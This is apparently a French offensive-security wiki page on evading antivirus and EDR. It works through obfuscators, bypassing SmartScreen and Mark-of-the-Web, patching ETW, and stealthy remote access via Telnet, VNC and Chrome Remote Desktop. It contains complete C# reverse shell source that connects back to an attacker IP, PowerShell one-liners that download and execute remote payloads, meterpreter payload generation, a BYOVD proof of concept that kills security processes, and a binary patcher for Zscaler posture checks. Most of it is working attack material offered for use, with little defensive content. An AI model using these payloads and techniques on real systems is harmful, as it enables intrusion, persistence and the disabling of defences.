- [**obfy**](https://github.com/fritzone/obfy) : ajoute une couche d’opérations obfusquées générées par le framework de métaprogrammation de templates C++, ce qui compliquera un peu la vie de la personne qui cherche à cracker l’application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)** :** Alcatraz est un obfuscateur binaire x64 capable d’obfusquer différents fichiers PE, notamment : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame) : Metame est un simple moteur de code métamorphique pour des exécutables quelconques.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator) : ROPfuscator est un framework d’obfuscation de code à granularité fine pour les langages pris en charge par LLVM, qui utilise ROP (programmation orientée retour). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions classiques en chaînes ROP, ce qui déjoue notre conception intuitive du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt) : Nimcrypt est un crypter PE .NET écrit en Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)** :** Inceptor peut convertir des EXE/DLL existants en shellcode, puis les charger.

### Auto-masquage par fonction assisté par le compilateur LLVM

Au lieu de masquer un implant entier uniquement lorsqu’il est en veille, un backend LLVM X86 modifié peut garder certaines fonctions masquées par XOR lorsqu’elles sont inactives. La PoC Function Peekaboo sélectionne les noms démanglés contenant `REG_`, injecte des stubs d’entrée/sortie indépendants de la position autour du code machine final et émet un gestionnaire de masquage commun dans `.text` ; les signatures au niveau source et la convention d’appel Windows x64 restent inchangées.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformation du flux de contrôle du backend

Cette étape doit avoir lieu après la sélection des instructions et l’optimisation, car la transformation doit couvrir **chaque instruction de retour émise** et connaître la disposition x86 exacte. Un `MachineFunctionPass` pré-émission recherche la dernière `MachineInstr::isReturn()`, la supprime afin que le chemin final passe dans l’épilogue ajouté, et remplace les retours précédents par `JMP_1 handler`. Conservez toute restauration de pile/cadre générée par le compilateur avant chaque retour ; ne redirigez que l’instruction de retour elle-même.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` et `emitFunctionBodyEnd()` émettent les stubs par fonction, tandis que `emitEndOfAsmFile()` émet le gestionnaire. Des symboles partagés entre les étapes d’émission permettent à un branchement de prologue de cibler son épilogue ultérieur ; pour un `je` proche émis manuellement, écrivez `0F 84` suivi de l’expression MC de quatre octets `target - address_after_je`. Les appels et les sauts vers le gestionnaire peuvent plutôt être émis sous forme d’objets `MCInst` (`CALL64pcrel32` et `JMP_1`). Un pass doit renvoyer `false` pour une fonction non sélectionnée s’il n’a rien modifié ; la PoC renvoie incorrectement `true` dans ce cas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Métadonnées et initialisation pré-CRT

La PoC place une clé XOR et des enregistrements de 16 octets contenant un pointeur de fonction réadressé par le chargeur ainsi qu’une longueur à l’exécution dans `.funcmeta`. Bien que le champ C soit un `uint32_t`, le gestionnaire lit un QWORD à l’offset `+8` de l’enregistrement, consommant la longueur et son remplissage, puis avance de `0x10` octets entre les enregistrements. Les noms de sections PE ne font que huit octets, donc la recherche à l’exécution voit `.funcmet`. Un patcher externe ajoute un `.stub` exécutable, enregistre l’ancien RVA du point d’entrée dans le stub et redirige `AddressOfEntryPoint` ; le stub PIC obtient la base de l’image depuis `gs:[0x60]` → `[PEB+0x10]`, parcourt les imports PE32+ pour résoudre un `VirtualProtect` déjà importé et s’exécute avant le CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L’initialisation place une valeur sentinelle dans `gs:[0xE8]` et appelle chaque fonction des métadonnées. Son prologue, qui reste toujours lisible, enregistre le début de la fonction dans `gs:[0xF0]`, détecte la valeur sentinelle et ignore le corps encore démasqué. L’épilogue utilise ensuite `call handler` ; après que le gestionnaire a sauvegardé 13 registres (`0x68` octets), l’adresse de retour à `[rsp+0x68]` correspond à la fin de la fonction transformée : `end - start` peut donc être écrit dans son enregistrement de métadonnées. Le stub efface la valeur sentinelle et saute à `ImageBase + original_entry_point_RVA` après avoir masqué tous les corps.<sup>[[38]](#references)[[39]](#references)</sup>

Lors d’un appel normal, le prologue appelle le même gestionnaire symétrique pour décoder le corps. Le chemin final passe dans l’épilogue ajouté, tandis que chaque retour précédent saute directement vers le gestionnaire commun. L’épilogue normal utilise également `jmp handler` plutôt que `call` : après le nouveau masquage, le `ret` du gestionnaire consomme l’adresse de retour de l’appelant d’origine et préserve le résultat de la fonction dans `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive de masquage et indicateurs d’analyse

Le gestionnaire trouve l’enregistrement courant, ignore le prologue fixe visible (`0x46` octets dans cette version), passe le reste en `PAGE_EXECUTE_READWRITE`, applique un XOR octet par octet avec l’octet de poids faible de la clé, puis le passe en `PAGE_EXECUTE_READ`. La même boucle décode donc le corps à l’entrée et le code à chaque sortie normale.<sup>[[38]](#references)[[39]](#references)</sup>

Les indicateurs très révélateurs de cette conception comprennent :<sup>[[38]](#references)[[39]](#references)</sup>

- un point d’entrée dans un `.stub` exécutable et une section `.funcmet` contenant une clé ainsi que des pointeurs réadressés vers `.text` ;
- l’analyse pré-CRT du PEB, de la table d’importation et de la table des sections, suivie d’appels via chaque pointeur des métadonnées ;
- des prologues PIC `call`/`pop` identiques et de nombreux points de retour redirigés vers un seul gestionnaire ;
- des écritures dans `gs:[0xE8]`, `gs:[0xF0]` et `gs:[0xF8]`, suivies de transitions répétées de `VirtualProtect` et d’écritures XOR octet par octet dans des pages exécutables adossées à l’image.

Il s’agit d’une technique d’évasion des scanners mémoire, et non d’une protection cryptographique : le fichier patché contient toujours le corps original en clair, et un débogueur peut s’arrêter sur `VirtualProtect` ou sur la boucle XOR pour extraire la fonction active. Le XOR à un seul octet, les métadonnées lisibles et la limite fixe `0x46` facilitent également une récupération hors ligne.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Les emplacements TEB de la PoC sont propres à chaque thread, mais les pages de code modifiées sont communes au processus. Des entrées concurrentes ou récursives peuvent donc réactiver/désactiver les instructions pendant qu’une autre invocation s’exécute ; les exceptions et les sorties non locales peuvent également contourner le nouveau masquage. Une implémentation robuste doit synchroniser les transitions, restaurer la protection réellement renvoyée via `lpflOldProtect`, éviter les longueurs de stub codées en dur, vérifier l’alignement de la pile x64 dans les chemins `call` et `jmp`, et appeler `FlushInstructionCache` après la réécriture d’octets exécutables. Microsoft précise explicitement qu’il incombe à l’appelant d’assurer la cohérence du cache d’instructions lorsque du code exécutable est modifié.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vous avez peut-être vu cet écran après avoir téléchargé et exécuté certains exécutables depuis Internet.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l’utilisateur final contre l’exécution d’applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen repose principalement sur la réputation : les applications rarement téléchargées déclenchent donc SmartScreen, qui avertit l’utilisateur final et l’empêche d’exécuter le fichier (bien que celui-ci puisse tout de même être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier, créé automatiquement lors du téléchargement de fichiers depuis Internet et contenant l’URL d’origine.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du flux ADS Zone.Identifier d’un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Un moyen très efficace d’empêcher vos payloads de recevoir le Mark of The Web consiste à les empaqueter dans un conteneur quelconque, comme un ISO. En effet, le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie pour contourner le Mark-of-the-Web.

Exemple d’utilisation :

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Voici une démonstration du contournement de SmartScreen en empaquetant des payloads dans des fichiers ISO à l’aide de [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un mécanisme de journalisation puissant de Windows qui permet aux applications et aux composants système de **journaliser des événements**. Cependant, il peut également être utilisé par des produits de sécurité pour surveiller et détecter les activités malveillantes.

Tout comme il est possible de désactiver (contourner) AMSI, il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans journaliser aucun événement. Pour cela, on modifie la fonction en mémoire afin qu’elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous trouverez plus d’informations dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Réflexion des assemblies C#

Le chargement de binaires C# en mémoire est connu depuis un certain temps, et c’est toujours un très bon moyen d’exécuter vos outils de post-exploitation sans être détecté par l’AV.

Comme le payload sera chargé directement en mémoire sans toucher au disque, il nous suffira de nous préoccuper du patching d’AMSI pour l’ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) permettent déjà d’exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cette méthode consiste à **lancer un nouveau processus sacrificiel**, à injecter votre code malveillant de post-exploitation dans ce nouveau processus, à exécuter votre code malveillant, puis à terminer le nouveau processus une fois l’exécution terminée. Cette méthode présente des avantages et des inconvénients. L’avantage de la méthode fork and run est que l’exécution se déroule **en dehors** du processus de notre implant Beacon. Ainsi, si une opération de post-exploitation échoue ou est détectée, il y a **beaucoup plus de chances** que notre **implant survive**. L’inconvénient est que vous avez **plus de chances** d’être détecté par des **détections comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s’agit d’injecter le code malveillant de post-exploitation **dans son propre processus**. Ainsi, vous pouvez éviter de créer un nouveau processus et de le faire analyser par l’AV. En revanche, si l’exécution de votre payload échoue, vous avez **beaucoup plus de chances** de **perdre votre beacon**, car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Pour en savoir plus sur le chargement d’assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des assemblies C# **depuis PowerShell**. Consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et [la vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilisation d’autres langages de programmation

Comme le propose [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d’exécuter du code malveillant dans d’autres langages en donnant à la machine compromise accès **à l’environnement d’interpréteur installé sur le partage SMB contrôlé par l’attaquant**.

En donnant accès aux binaires de l’interpréteur et à l’environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages, en mémoire** sur la machine compromise.

Le dépôt indique : Defender analyse toujours les scripts, mais l’utilisation de Go, Java, PHP, etc. nous offre **plus de flexibilité pour contourner les signatures statiques**. Des tests avec des scripts reverse shell aléatoires non obfusqués dans ces langages ont donné de bons résultats.

## TokenStomping

Le Token stomping manipule le jeton d’accès d’un produit de sécurité tel qu’un EDR ou un AV. Réduire les privilèges du jeton peut laisser le processus en cours d’exécution tout en l’empêchant d’effectuer des actions d’inspection ou de remédiation privilégiées.

Pour éviter cela, Windows pourrait **empêcher les processus externes** d’obtenir des handles sur les jetons des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utilisation de logiciels de confiance

### Chrome Remote Desktop

Comme le décrit [**cet article de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d’une victime, puis de l’utiliser pour en prendre le contrôle et maintenir la persistence :<sup>[[35]](#references)</sup>
1. Téléchargez le fichier depuis https://remotedesktop.google.com/, cliquez sur « Set up via SSH », puis cliquez sur le fichier MSI pour Windows afin de le télécharger.
2. Exécutez silencieusement le programme d’installation sur la machine de la victime (droits d’administrateur requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur « Next ». L’assistant vous demandera alors de vous autoriser ; cliquez sur le bouton « Authorize » pour continuer.
4. Exécutez la commande fournie en y apportant les ajustements nécessaires : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (le paramètre `--pin` définit le PIN sans utiliser l’interface graphique).
 

## Techniques d’évasion avancées

L’évasion est un sujet très complexe. Il faut parfois tenir compte de nombreuses sources de télémétrie différentes au sein d’un même système ; il est donc pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement auquel vous serez confronté aura ses propres forces et faiblesses.

Je vous recommande vivement de regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94) pour vous familiariser avec des techniques d’évasion plus avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

C’est également une excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l’évasion en profondeur.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender détecte comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), qui **supprime des parties du binaire** jusqu’à **trouver la partie que Defender** considère comme malveillante, puis vous l’isole.\
Un autre outil qui fait **la même chose est** [**avred**](https://github.com/dobin/avred), qui propose le service sur le Web à l’adresse [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu’à Windows 10, toutes les versions de Windows incluaient un **serveur Telnet** que vous pouviez installer (en tant qu’administrateur) en exécutant :

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faites-le **démarrer** lorsque le système démarre et **exécutez-le** maintenant :

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Changer le port telnet** (furtivité) et désactiver le pare-feu :

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements bin, pas le programme d’installation)

**SUR L’HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l’option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier _**UltraVNC.ini**_ nouvellement créé sur la **victime**

#### **Connexion inversée**

L’**attaquant** doit **exécuter sur son** **hôte** le binaire `vncviewer.exe -listen 5900` afin d’être **prêt** à recevoir une **connexion VNC** inversée. Ensuite, sur la **victime** : démarrez le daemon winvnc avec `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENTION :** Pour rester discret, vous devez éviter certaines actions

- Ne démarrez pas `winvnc` s’il est déjà en cours d’exécution, sinon une [fenêtre pop-up](https://i.imgur.com/1SROTTl.png) s’affichera. Vérifiez s’il est en cours d’exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans que `UltraVNC.ini` se trouve dans le même répertoire, sinon [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png) s’ouvrira
- N’exécutez pas `winvnc -h` pour obtenir de l’aide, sinon une [fenêtre pop-up](https://i.imgur.com/oc18wcu.png) s’affichera

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dans GreatSCT :

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **payload XML** avec :

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Le Defender actuel terminera le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier Revershell C#

Compilez-le avec :

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Utilisez-le avec :

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# à l’aide du compilateur

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste des obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d’utilisation de Python pour créer des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Apportez votre propre pilote vulnérable (BYOVD) – Éliminer les AV/EDR depuis l’espace kernel

Storm-2603 a utilisé un petit utilitaire en console appelé **Antivirus Terminator** pour désactiver les protections des endpoints avant de déployer un ransomware. L’outil apporte son **propre pilote vulnérable, mais *signé*** et l’exploite pour exécuter des opérations privilégiées dans le kernel, que même les services AV Protected-Process-Light (PPL) ne peuvent pas bloquer.<sup>[[12]](#references)</sup>

Points clés
1. **Pilote signé** : le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le pilote légitimement signé `AToolsKrnl64.sys` du « System In-Depth Analysis Toolkit » d’Antiy Labs. Comme le pilote possède une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La première ligne enregistre le driver comme **service du noyau** et la deuxième le démarre afin que `\\.\ServiceMouse` soit accessible depuis l’espace utilisateur.
3. **IOCTL exposés par le driver**
   | Code IOCTL | Capacité                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
   | `0x990000D0` | Supprimer un fichier arbitraire sur le disque |
   | `0x990001D0` | Décharger le driver et supprimer le service |

   Proof-of-concept minimal en C :
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Pourquoi cela fonctionne** : BYOVD contourne entièrement les protections en user-mode ; le code exécuté dans le kernel peut ouvrir des processus *protégés*, les terminer ou altérer des objets du kernel, quelles que soient les fonctionnalités de renforcement PPL/PP, ELAM ou autres.

Détection / Atténuation
•  Activez la liste de blocage des pilotes vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.
•  Surveillez la création de nouveaux services *kernel* et déclenchez une alerte lorsqu’un pilote est chargé depuis un répertoire accessible en écriture à tous ou absent de la liste d’autorisation.
•  Surveillez les handles en user-mode vers des objets de périphérique personnalisés, suivis d’appels `DeviceIoControl` suspects.

### Contournement des vérifications de posture de Zscaler Client Connector par patch binaire sur disque

Le **Client Connector** de Zscaler applique localement des règles de posture des appareils et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles permettent un contournement complet :

1. L’évaluation de la posture se déroule **entièrement côté client** (un booléen est envoyé au serveur).
2. Les points de terminaison RPC internes vérifient uniquement que l’exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

En **patchant quatre binaires signés sur disque**, ces deux mécanismes peuvent être neutralisés :

| Binaire | Logique d’origine patchée | Résultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Renvoie toujours `1`, donc chaque vérification est considérée comme conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ tout processus, même non signé, peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d’intégrité du tunnel | Court-circuitées |

Extrait minimal du patcher :

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Après avoir remplacé les fichiers d’origine et redémarré la pile de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les points de terminaison RPC de named pipe (par exemple, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas montre comment des décisions de confiance entièrement côté client et de simples vérifications de signature peuvent être contournées à l’aide de quelques modifications d’octets.

## Abus des fonctionnalités de confiance de Microsoft Defender `BTR.sys`

Le pilote **Boot-Time Removal** de Defender est un contre-exemple intéressant au BYOVD classique. `BTR.sys` est un composant de remédiation légitime signé par Microsoft, sans bug de corruption mémoire ni interface IOCTL ; après avoir obtenu un accès administrateur et `SeLoadDriverPrivilege`, un opérateur peut plutôt falsifier sa transaction privée de remédiation afin d’obtenir les opérations prévues sur les fichiers et le registre en Ring-0. Il s’agit d’un **mécanisme de neutralisation d’AV/EDR après compromission, et non d’un vecteur d’accès initial ou d’escalade de privilèges** ; le pilote peut être extrait de la ressource `BOOTTIMETOOL` du `MpEngine.dll` de la cible elle-même, plutôt que d’importer un pilote tiers particulièrement visible.<sup>[[36]](#references)</sup>

### Préparer le pilote à usage unique

